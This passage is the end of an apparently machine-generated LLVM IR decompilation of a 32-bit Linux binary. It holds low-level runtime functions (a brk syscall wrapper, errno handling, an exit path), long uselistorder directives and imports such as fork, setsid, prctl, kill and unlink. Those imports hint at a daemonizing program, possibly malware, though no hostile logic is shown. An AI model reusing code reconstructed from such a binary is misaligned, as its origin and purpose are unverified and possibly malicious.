  uselistorder i32 2, { 57, 58, 59, 1, 90, 21, 91, 29, 54, 0, 30, 49, 31, 50, 32, 51, 15, 2, 86, 20, 3, 4, 5, 80, 6, 7, 8, 22, 23, 92, 9, 10, 27, 11, 33, 24, 28, 36, 34, 35, 17, 16, 25, 37, 26, 38, 62, 63, 76, 77, 65, 60, 64, 66, 67, 68, 69, 70, 71, 72, 73, 61, 74, 75, 13, 55, 40, 39, 81, 82, 83, 84, 85, 41, 44, 42, 45, 19, 43, 12, 46, 52, 47, 53, 48, 87, 88, 89, 14, 18, 78, 79, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 56 }
  uselistorder i8* null, { 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8054a27, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a25, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80549d7, { 1, 0 }
  uselistorder label %dec_label_pc_80549b3, { 1, 0 }
}

define i32 @function_8054a2d() local_unnamed_addr {
dec_label_pc_8054a2d:
  %v0_8054a2d = load i32, i32* @eax, align 4
  %v1_8054a2d = add i32 %v0_8054a2d, 28
  %v2_8054a2d = inttoptr i32 %v1_8054a2d to i32*
  %v3_8054a2d = load i32, i32* %v2_8054a2d, align 4
  store i32 %v3_8054a2d, i32* @global_var_8056f38.247, align 8
  %v1_8054a36 = add i32 %v0_8054a2d, 44
  %v2_8054a36 = inttoptr i32 %v1_8054a36 to i32*
  %v3_8054a36 = load i32, i32* %v2_8054a36, align 4
  store i32 %v3_8054a36, i32* @global_var_8056f3c.248, align 4
  ret i32 %v3_8054a36

; uselistorder directives
  uselistorder i32 44, { 7, 5, 4, 11, 13, 12, 8, 9, 10, 0, 2, 6, 14, 15, 16, 17, 1, 3 }
  uselistorder i32 28, { 29, 26, 27, 15, 24, 25, 30, 5, 6, 12, 7, 10, 11, 8, 16, 9, 17, 18, 19, 20, 21, 23, 22, 0, 28, 1, 13, 31, 4, 14, 3, 2, 32, 33, 34 }
}

define i32 @function_8054a3f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054a3f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054a3f = load i32, i32* @ebx, align 4
  store i32 %v0_8054a3f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8054a52 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8054a52, i32* @global_var_8056958.246, align 8
  %v7_8054a5d = icmp ult i32 %v1_8054a52, %arg1
  %v1_8054a5f = icmp eq i1 %v7_8054a5d, false
  br i1 %v1_8054a5f, label %dec_label_pc_8054a6f, label %dec_label_pc_8054a61

dec_label_pc_8054a61:                             ; preds = %dec_label_pc_8054a3f
  %v1_8054a61 = call i32 @function_8052729(i32 %v0_8054a3f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8054a69 = inttoptr i32 %v1_8054a61 to i32*
  store i32 12, i32* %v1_8054a69, align 4
  %v0_8054a6f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054a73.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054a6f

dec_label_pc_8054a6f:                             ; preds = %dec_label_pc_8054a3f, %dec_label_pc_8054a61
  %v2_8054a73 = phi i32 [ %v0_8054a3f, %dec_label_pc_8054a3f ], [ %v2_8054a73.pre, %dec_label_pc_8054a61 ]
  %v0_8054a6f = phi i32 [ 0, %dec_label_pc_8054a3f ], [ %v0_8054a6f.pre, %dec_label_pc_8054a61 ]
  store i32 %v2_8054a73, i32* @ebx, align 4
  ret i32 %v0_8054a6f

; uselistorder directives
  uselistorder i32 %v1_8054a52, { 1, 0 }
  uselistorder i32 12, { 128, 114, 115, 116, 117, 118, 82, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 108, 109, 110, 111, 112, 113, 144, 162, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 73, 161, 74, 119, 120, 121, 122, 123, 68, 76, 69, 77, 70, 78, 71, 79, 72, 80, 66, 81, 85, 86, 95, 96, 97, 98, 87, 99, 90, 83, 89, 91, 92, 93, 100, 84, 88, 28, 94, 101, 107, 67, 102, 104, 105, 29, 103, 30, 31, 32, 33, 124, 0, 125, 126, 127, 34, 35, 36, 37, 38, 39, 106, 1, 2, 26, 10, 9, 8, 16, 64, 21, 43, 44, 42, 17, 49, 41, 47, 48, 18, 163, 7, 45, 46, 4, 6, 40, 164, 65, 165, 169, 166, 167, 168, 50, 51, 52, 53, 19, 20, 54, 55, 56, 170, 57, 58, 59, 60, 61, 62, 63, 5, 22, 23, 11, 12, 13, 14, 15, 171, 24, 3, 25, 172, 173, 27, 75 }
  uselistorder i32* @global_var_8056958.246, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_8054a6f, { 1, 0 }
}

define i32 @function_8054a75() local_unnamed_addr {
dec_label_pc_8054a75:
  %v0_8054a78 = load i32, i32* @eax, align 4
  %v1_8054a7a = sub i32 0, %v0_8054a78
  %v1_8054a7c = call i32 @function_8052729(i32 ptrtoint (i32* @0 to i32))
  %v2_8054a81 = inttoptr i32 %v1_8054a7c to i32*
  store i32 %v1_8054a7a, i32* %v2_8054a81, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_8052729, { 37, 36, 53, 35, 34, 45, 1, 33, 56, 32, 31, 30, 0, 43, 42, 57, 29, 28, 27, 25, 24, 23, 41, 40, 44, 4, 18, 5, 55, 54, 39, 38, 17, 52, 16, 11, 20, 19, 51, 10, 15, 14, 50, 26, 22, 49, 13, 21, 12, 9, 48, 8, 7, 47, 46, 2, 6, 3 }
  uselistorder i32* @0, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 7, 8, 9, 18, 13, 16, 17, 14, 10, 11, 12, 15, 32, 33, 34, 35, 36, 37, 19, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 96, 201, 95, 129, 130, 181, 182, 183, 131, 132, 128, 149, 148, 144, 145, 146, 147, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 98, 184, 185, 186, 187, 188, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 203, 204, 205, 206, 207 }
}

define i32 @function_8054a90() local_unnamed_addr {
dec_label_pc_8054a90:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8054a9c = load i32, i32* @global_var_80567e4.233, align 4
  %v10_8054aa1 = icmp eq i32 %v0_8054a9c, -1
  br i1 %v10_8054aa1, label %dec_label_pc_8054ab2, label %dec_label_pc_8054aa6.preheader

dec_label_pc_8054aa6.preheader:                   ; preds = %dec_label_pc_8054a90
  br label %dec_label_pc_8054aa6

dec_label_pc_8054aa6:                             ; preds = %dec_label_pc_8054aa6.preheader, %dec_label_pc_8054aa6
  %v4_8054aa9 = phi i32 [ %v0_8054a9c, %dec_label_pc_8054aa6.preheader ], [ %v2_8054aab, %dec_label_pc_8054aa6 ]
  %v0_8054aa6 = phi i32 [ ptrtoint (i32* @global_var_80567e4.233 to i32), %dec_label_pc_8054aa6.preheader ], [ %v1_8054aa6, %dec_label_pc_8054aa6 ]
  %v1_8054aa6 = add i32 %v0_8054aa6, -4
  call void @__pseudo_call(i32 %v4_8054aa9)
  %v1_8054aab = inttoptr i32 %v1_8054aa6 to i32*
  %v2_8054aab = load i32, i32* %v1_8054aab, align 4
  %v10_8054aad = icmp eq i32 %v2_8054aab, -1
  %v1_8054ab0 = icmp eq i1 %v10_8054aad, false
  br i1 %v1_8054ab0, label %dec_label_pc_8054aa6, label %dec_label_pc_8054ab2.loopexit

dec_label_pc_8054ab2.loopexit:                    ; preds = %dec_label_pc_8054aa6
  %v2_8054ab2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054ab2

dec_label_pc_8054ab2:                             ; preds = %dec_label_pc_8054ab2.loopexit, %dec_label_pc_8054a90
  %v2_8054ab2 = phi i32 [ %v2_8054ab2.pre, %dec_label_pc_8054ab2.loopexit ], [ %tmp6, %dec_label_pc_8054a90 ]
  ret i32 %v2_8054ab2

; uselistorder directives
  uselistorder i32 %v0_8054a9c, { 1, 0 }
  uselistorder i1 false, { 125, 126, 28, 29, 31, 30, 127, 128, 129, 97, 98, 130, 133, 134, 135, 136, 137, 139, 11, 140, 141, 138, 132, 131, 25, 142, 143, 144, 1, 146, 147, 0, 148, 99, 100, 101, 102, 103, 104, 12, 149, 150, 151, 3, 152, 153, 154, 155, 2, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 156, 79, 80, 81, 82, 83, 84, 85, 86, 87, 169, 170, 171, 172, 173, 174, 175, 176, 177, 10, 179, 178, 183, 180, 181, 182, 13, 184, 185, 145, 26, 4, 27, 186, 187, 15, 105, 106, 107, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 16, 198, 108, 109, 110, 199, 200, 201, 5, 32, 6, 202, 203, 204, 35, 45, 50, 51, 36, 53, 46, 47, 48, 52, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 49, 54, 55, 78, 76, 18, 77, 19, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 75, 70, 73, 88, 89, 90, 91, 92, 93, 94, 20, 95, 96, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 71, 72, 74, 205, 206, 207, 208, 209, 7, 211, 212, 213, 210, 214, 215, 216, 217, 218, 219, 8, 220, 221, 222, 223, 17, 224, 225, 226, 227, 228, 229, 230, 22, 21, 231, 23, 232, 233, 234, 235, 9, 24, 14, 236 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 102, 103, 104, 105, 11, 106, 3, 101, 19, 97, 12, 98, 99, 100, 13, 0, 9, 10, 107, 108, 109, 110, 111, 112, 113, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 7, 57, 8, 58, 59, 60, 2, 6, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 4, 5, 89, 90, 91, 92, 93, 94, 95, 1, 96 }
  uselistorder i32 ptrtoint (i32* @global_var_80567e4.233 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 27, 28, 0, 121, 204, 76, 122, 77, 78, 123, 79, 124, 80, 125, 81, 126, 82, 127, 83, 128, 84, 129, 85, 130, 86, 131, 25, 26, 13, 12, 87, 88, 132, 89, 133, 90, 134, 29, 1, 135, 75, 91, 92, 136, 137, 138, 15, 139, 14, 140, 94, 93, 141, 205, 17, 18, 142, 16, 143, 30, 206, 31, 144, 207, 34, 33, 35, 36, 22, 37, 95, 38, 145, 32, 208, 11, 146, 147, 117, 148, 19, 39, 2, 96, 209, 210, 97, 202, 40, 98, 149, 99, 150, 100, 151, 73, 74, 152, 101, 153, 102, 154, 103, 155, 104, 156, 105, 157, 106, 158, 107, 159, 108, 160, 109, 161, 110, 162, 111, 163, 112, 164, 113, 165, 114, 166, 115, 167, 41, 168, 169, 3, 170, 20, 4, 171, 42, 172, 116, 211, 118, 43, 173, 174, 198, 199, 175, 194, 200, 44, 176, 177, 178, 179, 195, 48, 180, 181, 182, 183, 184, 185, 47, 186, 196, 45, 46, 187, 197, 188, 189, 49, 190, 201, 5, 50, 51, 52, 53, 54, 191, 192, 23, 6, 55, 193, 21, 10, 9, 8, 7, 56, 203, 57, 58, 59, 60, 61, 24, 62, 212, 213, 214, 63, 215, 216, 69, 64, 217, 65, 66, 67, 68, 218, 70, 219, 71, 72, 220, 221, 119, 120 }
  uselistorder i32 1, { 275, 276, 77, 159, 160, 414, 415, 416, 417, 161, 514, 277, 59, 58, 60, 278, 67, 66, 65, 279, 24, 280, 282, 281, 79, 284, 283, 61, 286, 285, 13, 287, 53, 288, 102, 289, 124, 290, 123, 291, 103, 292, 112, 293, 294, 8, 10, 9, 184, 69, 296, 295, 298, 297, 43, 299, 34, 301, 300, 70, 302, 306, 305, 304, 303, 85, 515, 516, 517, 308, 307, 89, 88, 162, 309, 311, 310, 104, 163, 259, 412, 146, 317, 316, 315, 314, 313, 312, 62, 63, 185, 318, 478, 479, 480, 257, 481, 319, 4, 5, 6, 3, 7, 164, 260, 322, 321, 320, 97, 186, 519, 520, 521, 323, 93, 522, 523, 165, 524, 525, 526, 92, 90, 91, 261, 518, 187, 113, 114, 115, 116, 188, 166, 452, 453, 454, 455, 326, 325, 324, 119, 118, 120, 189, 327, 40, 41, 191, 527, 528, 529, 530, 531, 532, 533, 534, 535, 190, 536, 537, 538, 539, 540, 167, 541, 542, 125, 168, 543, 544, 545, 546, 169, 170, 547, 548, 549, 329, 328, 81, 80, 82, 84, 83, 171, 172, 330, 173, 174, 192, 334, 333, 332, 331, 76, 193, 262, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 194, 195, 351, 350, 352, 175, 355, 354, 353, 52, 196, 356, 357, 42, 358, 100, 360, 359, 64, 361, 23, 362, 117, 363, 106, 365, 364, 11, 366, 12, 367, 72, 56, 369, 368, 78, 370, 51, 372, 371, 101, 374, 373, 98, 375, 105, 377, 376, 71, 378, 57, 379, 96, 68, 550, 551, 552, 553, 258, 380, 21, 17, 20, 18, 19, 22, 554, 555, 126, 127, 556, 557, 0, 558, 559, 560, 561, 562, 197, 563, 198, 564, 382, 381, 99, 482, 176, 55, 54, 565, 177, 240, 566, 567, 178, 568, 569, 199, 570, 131, 86, 87, 418, 132, 383, 74, 75, 73, 571, 572, 573, 384, 31, 32, 30, 33, 574, 575, 268, 35, 37, 36, 39, 38, 576, 269, 14, 15, 16, 421, 422, 423, 424, 425, 426, 427, 435, 436, 437, 200, 438, 428, 206, 439, 212, 431, 214, 419, 208, 430, 204, 432, 202, 433, 440, 215, 210, 420, 211, 216, 217, 429, 209, 213, 205, 203, 201, 434, 441, 218, 207, 451, 449, 450, 442, 443, 444, 445, 447, 219, 448, 108, 110, 109, 107, 111, 446, 263, 385, 121, 456, 457, 458, 459, 245, 244, 139, 128, 460, 461, 179, 137, 138, 129, 462, 463, 180, 136, 246, 248, 464, 465, 264, 466, 467, 468, 241, 242, 469, 470, 243, 249, 247, 471, 472, 473, 220, 474, 475, 476, 183, 477, 388, 387, 386, 26, 27, 28, 25, 29, 389, 270, 390, 221, 181, 265, 391, 393, 392, 147, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 222, 493, 494, 495, 496, 158, 223, 266, 224, 267, 513, 225, 398, 397, 396, 395, 394, 122, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 403, 402, 271, 274, 401, 400, 272, 399, 94, 95, 1, 250, 2, 148, 149, 577, 578, 579, 580, 581, 133, 134, 582, 583, 584, 585, 586, 229, 140, 141, 228, 142, 232, 143, 587, 588, 230, 144, 145, 231, 589, 135, 130, 590, 591, 592, 593, 594, 251, 150, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 236, 157, 156, 605, 252, 151, 606, 607, 608, 609, 610, 233, 611, 612, 234, 613, 253, 152, 614, 254, 153, 615, 616, 255, 154, 617, 618, 256, 155, 619, 620, 621, 622, 623, 235, 624, 626, 627, 625, 237, 628, 629, 630, 631, 226, 227, 632, 633, 634, 635, 238, 413, 239, 636, 182, 410, 409, 408, 407, 406, 405, 404, 273, 49, 47, 46, 44, 45, 48, 50, 411 }
  uselistorder label %dec_label_pc_8054aa6, { 1, 0 }
}

define i32 @function_8054ab6() local_unnamed_addr {
entry:
  %v0_8054ab9 = load i32, i32* @ebx, align 4
  %v1_8054aba = call i32 @function_80480b0(i32 %v0_8054ab9)
  store i32 %v1_8054aba, i32* @eax, align 4
  %v0_8054ac5 = call i32 @function_80480c0()
  ret i32 %v0_8054ac5

; uselistorder directives
  uselistorder i32* @eax, { 9, 50, 51, 53, 54, 55, 56, 58, 16, 59, 1, 57, 6, 8, 52, 60, 62, 63, 61, 34, 35, 64, 70, 65, 66, 68, 69, 67, 37, 38, 17, 2, 3, 10, 24, 26, 25, 27, 31, 32, 33, 28, 29, 30, 36, 5, 18, 39, 11, 40, 41, 42, 12, 43, 0, 13, 14, 44, 45, 46, 47, 15, 71, 19, 20, 21, 72, 73, 74, 75, 76, 22, 23, 77, 48, 49, 4, 7 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 685, 70, 396, 71, 474, 475, 72, 476, 477, 478, 73, 145, 146, 585, 586, 74, 480, 686, 687, 688, 202, 689, 690, 691, 564, 587, 588, 692, 465, 464, 693, 694, 695, 466, 589, 590, 591, 592, 462, 696, 697, 698, 75, 699, 147, 704, 705, 10, 76, 397, 11, 398, 399, 707, 708, 139, 709, 77, 378, 78, 203, 204, 0, 700, 701, 702, 79, 463, 389, 80, 400, 710, 1, 148, 149, 81, 711, 712, 82, 83, 714, 713, 26, 27, 715, 718, 205, 379, 719, 721, 720, 24, 25, 722, 703, 593, 594, 595, 596, 401, 402, 53, 597, 201, 403, 150, 84, 723, 30, 380, 85, 151, 727, 730, 729, 28, 29, 733, 734, 735, 736, 737, 152, 738, 739, 740, 206, 731, 207, 732, 208, 404, 565, 64, 566, 153, 405, 567, 568, 741, 742, 743, 744, 745, 746, 747, 748, 749, 154, 155, 750, 406, 762, 407, 408, 209, 381, 409, 210, 382, 86, 410, 751, 752, 87, 88, 211, 383, 66, 753, 754, 755, 89, 90, 212, 384, 65, 756, 140, 757, 55, 758, 759, 761, 411, 760, 2, 728, 716, 717, 467, 468, 470, 469, 31, 32, 3, 156, 471, 472, 473, 479, 598, 599, 412, 413, 600, 601, 602, 603, 604, 605, 606, 607, 414, 481, 608, 763, 726, 482, 764, 609, 610, 483, 706, 67, 157, 724, 484, 611, 725, 612, 765, 485, 766, 767, 415, 768, 8, 91, 416, 769, 213, 770, 771, 158, 772, 12, 33, 56, 13, 57, 14, 773, 4, 34, 58, 15, 59, 16, 93, 92, 60, 17, 94, 95, 486, 68, 613, 614, 96, 417, 391, 774, 775, 776, 777, 778, 779, 99, 98, 97, 780, 167, 101, 100, 102, 418, 781, 137, 419, 487, 420, 421, 9, 103, 422, 61, 18, 104, 423, 105, 424, 425, 426, 490, 491, 492, 427, 159, 493, 495, 496, 497, 428, 509, 510, 511, 512, 513, 107, 108, 429, 514, 515, 498, 430, 431, 520, 521, 519, 507, 508, 488, 489, 516, 517, 518, 499, 500, 501, 502, 503, 504, 505, 506, 19, 142, 143, 138, 432, 106, 433, 522, 562, 563, 559, 560, 561, 141, 557, 558, 109, 434, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 392, 435, 535, 436, 110, 437, 537, 538, 539, 540, 541, 160, 161, 542, 543, 544, 438, 494, 552, 553, 554, 555, 545, 546, 547, 551, 556, 111, 162, 536, 112, 385, 439, 440, 393, 394, 569, 570, 47, 45, 441, 46, 44, 442, 571, 572, 573, 574, 575, 576, 577, 168, 443, 578, 579, 580, 581, 386, 444, 445, 582, 583, 69, 584, 163, 113, 176, 615, 114, 183, 184, 185, 174, 175, 35, 36, 616, 617, 618, 115, 51, 619, 620, 621, 622, 116, 50, 623, 624, 625, 626, 117, 49, 627, 628, 629, 630, 118, 48, 631, 632, 633, 177, 178, 179, 180, 181, 182, 634, 635, 172, 171, 636, 169, 7, 6, 170, 637, 173, 638, 186, 639, 187, 640, 188, 641, 189, 642, 644, 645, 646, 643, 647, 648, 190, 191, 649, 164, 650, 165, 119, 673, 20, 62, 387, 446, 447, 448, 651, 657, 192, 652, 653, 193, 654, 194, 655, 195, 656, 39, 658, 196, 197, 659, 198, 660, 661, 199, 662, 200, 663, 664, 665, 666, 449, 667, 668, 669, 670, 38, 214, 120, 121, 450, 451, 671, 672, 52, 63, 122, 452, 37, 215, 217, 218, 453, 123, 124, 216, 388, 125, 548, 549, 550, 21, 126, 395, 22, 219, 127, 128, 674, 675, 676, 677, 678, 679, 782, 783, 680, 681, 784, 785, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 786, 787, 788, 789, 790, 791, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 43, 847, 848, 849, 850, 851, 852, 853, 129, 454, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 455, 892, 884, 885, 886, 887, 888, 889, 890, 891, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 130, 456, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 220, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 968, 967, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 131, 457, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 132, 458, 1017, 1018, 390, 1019, 1020, 459, 1021, 1022, 1023, 133, 460, 1024, 54, 1025, 23, 40, 41, 42, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 166, 134, 135, 5, 682, 683, 684, 136, 461, 144, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041 }
  uselistorder i32* @ebx, { 22, 372, 373, 231, 232, 27, 374, 2, 375, 376, 377, 378, 182, 183, 379, 24, 380, 381, 382, 383, 384, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 3, 252, 253, 254, 23, 385, 386, 387, 388, 389, 390, 391, 392, 393, 20, 21, 402, 403, 404, 405, 17, 4, 16, 396, 399, 400, 401, 394, 406, 407, 408, 409, 410, 411, 412, 413, 395, 255, 256, 422, 423, 424, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 5, 439, 440, 425, 426, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 6, 196, 197, 198, 199, 200, 201, 202, 441, 466, 467, 468, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 18, 452, 453, 454, 455, 456, 7, 457, 458, 459, 460, 461, 462, 463, 464, 465, 420, 421, 25, 26, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 28, 285, 286, 469, 470, 418, 419, 29, 471, 472, 287, 288, 289, 290, 30, 397, 398, 414, 415, 31, 291, 292, 416, 417, 293, 294, 473, 474, 32, 475, 476, 477, 33, 295, 296, 8, 297, 298, 34, 35, 478, 479, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 138, 139, 140, 156, 10, 157, 158, 159, 160, 145, 146, 161, 143, 136, 142, 144, 147, 148, 149, 137, 162, 141, 150, 151, 152, 153, 154, 155, 163, 164, 165, 166, 167, 168, 178, 179, 180, 9, 181, 169, 170, 171, 172, 173, 174, 175, 176, 177, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 301, 299, 300, 0, 302, 303, 304, 305, 306, 307, 12, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 19, 357, 358, 359, 360, 361, 362, 363, 480, 481, 482, 364, 365, 366, 367, 483, 484, 485, 486, 13, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 487, 488, 489, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 1, 519, 520, 521, 522, 523, 15, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 14, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 368, 369, 370, 371 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

